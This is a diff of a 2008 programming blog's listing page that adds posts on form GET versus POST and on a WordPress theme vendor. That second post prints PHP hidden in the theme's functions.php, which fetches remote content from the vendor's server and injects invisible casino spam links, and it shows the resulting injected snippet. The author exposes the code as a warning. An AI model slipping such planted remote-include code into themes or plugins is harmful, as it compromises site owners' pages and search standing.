@@ -7,7 +7,7 @@
 	<meta name="author" content="Michael Sharman">
 
 	
-	<meta name="description" content="This is cool, a little Firefox addon from the guys at lifehacker to make your youtube experience a little richer :) It basically combines several &hellip;">
+	<meta name="description" content="Today I had a situation where I wanted to convert a boolean value (true or false) to a numeric equivalent (1 or 0) for insertion into a database &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -43,7 +43,7 @@
 	<div class="alignright search">
 		<a class="button"></a>
 		<div class="container">
-			<form action="http://google.com/search" method="get">
+			<form action="http://www.google.com/search" method="get">
 				<input type="text" name="q" results="0">
 				<input type="hidden" name="q" value="site:chapter31.com">
 			</form>
@@ -69,9 +69,10 @@
 		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
 		
 	</div>
-	<form class="search" action="http://google.com/search" method="get">
-		<input class="alignright" type="text" name="q" results="0">
-		<input type="hidden" name="q" value="site:chapter31.com">
+	<form class="search" action="http://www.google.com/search" method="get">
+		<input class="alignright" type="text" name="query" results="0">
+        <input type="hidden" name="q" value="site:chapter31.com"
+        onkeydown="if (event.keyCode === 13 || event.which === 13) { location.href='http://www.google.com/search?q=' + site:chapter31.com + ' ' + encodeURIComponent(document.getElementById('query').value);}">
 	</form>
 </nav>
 
@@ -81,129 +82,6 @@
 
 	
 	<div id="content" class="inner">
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/2008/03/06/better-youtube-firefox-extension/">
-		
-			Better YouTube Firefox Extension</a>
-	</h2>
-	<div class="entry-content">
-		<p>This is cool, a <a href="http://lifehacker.com/software/exclusive-lifehacker-download/better-youtube-firefox-extension-319925.php">little Firefox addon</a> from the guys at <a href="http://www.lifehacker.com/">lifehacker</a> to make your <a href="http://www.youtube.com/">youtube</a> experience a little richer :)</p>
-
-<p>It basically combines several Greasemonkey scripts together into a single package.</p>
-
-<p>Features include:</p>
-
-<ul>
-<li>smartly enlarges videos for better viewing</li>
-<li>hides user comments</li>
-<li>declutters the page</li>
-<li>disables autoplay</li>
-</ul>
-
-
-<p><a href="http://ginatrapani.org/workshop/firefox/betteryoutube_0.4.1.xpi">Download</a> and install the addon, restart Firefox and you&#8217;re set to go. To edit the preferences you need to go to:</p>
-
-<p>Tools -> Add-ons</p>
-
-<p>And choose &#8216;preferences&#8217; for the &#8220;Better YouTube&#8221; extension.</p>
-
-<p>Some nice options there, I added a screenshot below of the &#8220;Theater View&#8221;</p>
-
-<p><a href="/images/uploads/2008/03/screenshot-youtube.jpg"><img src="/images/uploads/2008/03/screenshot-youtube.thumbnail.jpg" alt="Better YouTube Firefox Extension" /></a></p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2008-03-06T14:21:39+11:00" pubdate data-updated="true">Mar 6<span>th</span>, 2008</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/categories/misc/'>Misc</a>
-
-
-</div>
-	
-		<div class="comments"><a href="/2008/03/06/better-youtube-firefox-extension//page/15/index.html#disqus_thread">Comments</a></div>
-	
-</div></article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/2008/03/03/always-add-the-cfimport-tag-when-using-cfimport-style-syntax/">
-		
-			Always Add the <cfimport> Tag When Using Cfimport Style Syntax</a>
-	</h2>
-	<div class="entry-content">
-		<p>Using <a href="http://livedocs.adobe.com/coldfusion/8/htmldocs/help.html?content=Tags_i_04.html">cfimport</a> is a great way to add custom tag functionality to your applications.</p>
-
-<p>One thing you need to do of course is add a <cfimport> tag to <em>every template</em> where you want to use the cfimport syntax. However, a couple of times when I&#8217;ve been creating new templates I&#8217;ve forgotten this rule and <strong>not</strong> added <cfimport> and subsequently gotten confused when my results aren&#8217;t as expected.</p>
-
-<p>I think the annoying thing is that ColdFusion does not throw an error in these situations, it just does nothing. So I can go to any template and add the following (without a <cfimport> on my template):</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">tags</span><span class="o">:</span><span class="nx">myNonExistentTag</span> <span class="o">/&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And the template runs without an error being thrown :(</p>
-
-<p>So my reminder to myself before looking everywhere else is:</p>
-
-<p><em>&#8220;Michael&#8230;for the love of <a href="http://www.benji.com/">Benji</a> please check that you&#8217;ve added <cfimport> before doing any other debugging!&#8221;</em></p>
-
-<p>Now my question (which I&#8217;m sure someone out there knows) is why does this not throw an  error (missing template/include/tag etc)?</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2008-03-03T11:32:45+11:00" pubdate data-updated="true">Mar 3<span>rd</span>, 2008</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/categories/coldfusion/'>ColdFusion</a>
-
-
-</div>
-	
-		<div class="comments"><a href="/2008/03/03/always-add-the-cfimport-tag-when-using-cfimport-style-syntax//page/15/index.html#disqus_thread">Comments</a></div>
-	
-</div></article>
 
 
     <article class="post">
@@ -806,6 +684,174 @@
 </div>
 	
 		<div class="comments"><a href="/2008/02/07/the-only-valid-measurement-of-code-quality//page/15/index.html#disqus_thread">Comments</a></div>
+	
+</div></article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/2008/01/24/dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes/">
+		
+			Don&#8217;t Ever User www.templatesbrowser.com for Wordpress Themes</a>
+	</h2>
+	<div class="entry-content">
+		<p>Today I noticed a JavaScript error on my site, on investigation I saw the following JavaScript code in the page source:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">CCounter</span><span class="o">=</span><span class="mi">2151068</span><span class="p">;</span> <span class="kd">var</span> <span class="nx">CCsite</span><span class="o">=</span><span class="nx">www</span><span class="p">.</span><span class="nx">chapter31</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">CCinvisible</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">nosc</span><span class="o">/</span><span class="nx">ript</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">hreflang</span><span class="o">=</span><span class="s2">&quot;de&quot;</span> <span class="nx">lang</span><span class="o">=</span><span class="s2">&quot;de&quot;</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;http://www.portalux.com/&quot;</span><span class="o">&gt;</span><span class="nx">online</span> <span class="nx">casino</span><span class="o">&lt;</span><span class="err">/a&gt;&lt;/nosc/ript&gt;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">CCounter</span><span class="o">=</span><span class="mi">2151068</span><span class="p">;</span> <span class="kd">var</span> <span class="nx">CCsite</span><span class="o">=</span><span class="nx">www</span><span class="p">.</span><span class="nx">chapter31</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">CCinvisible</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>My investigations found that where I downloaded the template from was a nice (NOT) little site called <a href="http://www.templatesbrowser.com/wordpress-themes/">http://www.templatesbrowser.com/</a>. Now what they do is add a &#8220;functions.php&#8221; file in the original code base, then call a method from the footer &#8220;credits();&#8221; which is in the functions.php file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">credits</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'> <span class="nx">$url</span> <span class="o">=</span> <span class="s2">&quot;http://get.templatesbrowser.com/wp.php?&quot;</span> <span class="p">.</span>
+</span><span class='line'>       <span class="s2">&quot;url=&quot;</span> <span class="p">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">])</span> <span class="p">.</span> <span class="s2">&quot;&amp;&quot;</span> <span class="p">.</span> <span class="s2">&quot;host=&quot;</span> <span class="p">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]);</span>
+</span><span class='line'> <span class="nx">$check</span> <span class="o">=</span> <span class="err">@</span><span class="nx">fsockopen</span><span class="p">(</span><span class="s2">&quot;get.templatesbrowser.com&quot;</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="nx">$errno</span><span class="p">,</span> <span class="nx">$errstr</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="nx">$check</span><span class="p">)</span>
+</span><span class='line'> <span class="p">{</span>
+</span><span class='line'>  <span class="err">@</span><span class="nx">readfile</span><span class="p">(</span><span class="nx">$url</span><span class="p">);</span>
+</span><span class='line'>  <span class="nx">fclose</span><span class="p">(</span><span class="nx">$check</span><span class="p">);</span>
+</span><span class='line'> <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">?&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>More information was found from <a href="http://www.onnoot.com/e/532/Templatesbrowser.com_puts_link_spam_in_WordPress">www.onnoot.com/</a>:</p>
+
+<blockquote><p>This produces a link at the bottom of every WordPress page, that is invisible for human readers.</p>
+
+<p>Templatesbrowser.com apparently does this to increase the pagerank of certain websites. Weâ€™re not sure if Google falls for this little link spam trick. But if Google does find out that your page contains link spam, you risk being punished. That could mean that your website is removed from Google&#8217;s search result pages.</p></blockquote>
+
+<p>So for those who don&#8217;t know I hope this was useful, if any people out there are crackers/hackers do me a favour and pull their site down :)</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2008-01-24T15:43:02+11:00" pubdate data-updated="true">Jan 24<span>th</span>, 2008</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/categories/misc/'>Misc</a>, <a class='category' href='/categories/php/'>php</a>
+
+
+</div>
+	
+		<div class="comments"><a href="/2008/01/24/dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes//page/15/index.html#disqus_thread">Comments</a></div>
+	
+</div></article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/2008/01/24/when-to-use-form-post-vs-get/">
+		
+			When to Use Form POST vs GET?</a>
+	</h2>
+	<div class="entry-content">
+		<p>I read <a href="http://www.coldfusionmuse.com/index.cfm/2008/1/23/web.logs.security">a post</a> today from <a href="http://www.coldfusionmuse.com/">Mark Kruger</a> where he was warning against the possible side effects when using GET as a form submit <em>method</em>.</p>
+
+<p>I think I (unintentionally) offended Mark with my comment where I asked <em>why would anyone EVER use GET?</em> because I pretty much always use POST so was wondering why you would use GET.</p>
+
+<p>In my search for answers I asked <a href="http://www.lynchconsulting.com.au/">Mark Lynch</a> who seems to always have the answer to my questions :)</p>
+
+<p>So in summary (from <a href="http://weblogs.asp.net/mschwarz/archive/2006/12/04/post-vs-get.aspx">Michael Schwarz</a>);</p>
+
+<blockquote><p>POST</p>
+
+<ol>
+<li>By default no proxy server or web browser is caching this data, you will always get the real data from you web server.</li>
+<li>The length of data you can send to the web server is only restricted by the web server itself, but there is no real restriction.</li>
+<li>Character encoding can be done easily using application/x-www-form-urlencoded.</li>
+</ol>
+
+
+<p>GET</p>
+
+<ol>
+<li>Running a http request with GET can be cached on your web browser or a configured proxy server.</li>
+<li>To get the live data from you web server you have to modify the url that is used in your XHR invoke, simply by using a counter or new Date().getTime() which will generate a unique url.</li>
+<li>Maximum URL length is 2,083 characters in Internet Explorer (see MaxClientRequestBuffer: Use POST instead of GET to Send Large Amounts of Data in Request)</li>
+<li>In particular, the convention has been established that the GET and HEAD methods SHOULD NOT have the significance of taking an action other than retrieval. [RFC 2616 sec 9]</li>
+<li>Character encoding will reduce the amount of data that can be used because of url encoding entities (i.e. three Japanese characters are converted to this: %26%2312454%3B%26%2312455%3B%26%2312502%3B)</li>
+</ol>
+</blockquote>
+
+<p>There is also a <a href="http://www.cs.tut.fi/~jkorpela/forms/methods.html">great article here</a> if you want some further reading on this subject.</p>
+
+<p>For me (at this stage) this really only has an effect when doing Ajax. If I&#8217;m purely wanting to retrieve data (just HTML for example) from the server then I&#8217;ll use GET, but if I want to do something else with server <em>side effects</em> (such as posting data to be saved to a database) then I&#8217;ll use POST.</p>
+
+<p>Phew&#8230;you learn something new everyday!</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2008-01-24T14:01:30+11:00" pubdate data-updated="true">Jan 24<span>th</span>, 2008</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/categories/x-html/'>(X)HTML</a>
+
+
+</div>
+	
+		<div class="comments"><a href="/2008/01/24/when-to-use-form-post-vs-get//page/15/index.html#disqus_thread">Comments</a></div>
 	
 </div></article>
 
